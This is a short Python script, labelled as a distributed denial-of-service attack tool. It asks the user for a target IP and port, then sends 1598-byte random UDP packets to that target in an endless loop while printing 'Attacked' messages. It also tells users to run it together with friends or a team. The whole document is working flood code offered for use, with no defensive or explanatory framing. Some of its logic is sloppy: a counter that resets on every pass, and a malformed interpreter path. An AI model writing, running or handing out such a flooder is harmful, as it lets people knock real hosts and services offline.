#!/bin/usr/python3.8.x
# coding:utf-8
# Distributed denial of Service Attack

import os,sys,socket,random
from time import sleep

class main:
	def __init__(self):
		self.start()
		
	def start(self):
		os.system('clear')
		print("\033[1;91m• \033[1;97mDon't using alone, using with you friend/team")
		print()
		ip=str(input("\033[1;97m[\033[1;91m?\033[1;97m]\033[1;92m Target IP \033[1;97m:\033[1;96m "))
		port=int(input("\033[1;97m[\033[1;91m?\033[1;97m]\033[1;92m Port \033[1;97m:\033[1;96m "))
		ttl=int(input("\033[1;97m[\033[1;91m?\033[1;97m]\033[1;92m Jumblah Attacked\033[1;97m :\033[1;96m "))
		sleep(2)
		while True:
			sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			byte=random._urandom(1598)
			sock.sendto(byte, (ip,port))
			send = 0
			send = send + 1
			for att in range(ttl):
				print("\033[1;91m%s \033[1;94mAttacked to ---> \033[1;91m%s \033[1;94mWith Port ---> \033[1;91m%s"%(att,ip,port))
			print("\033[1;91m[!]\033[1;97m not down :(")
	
main()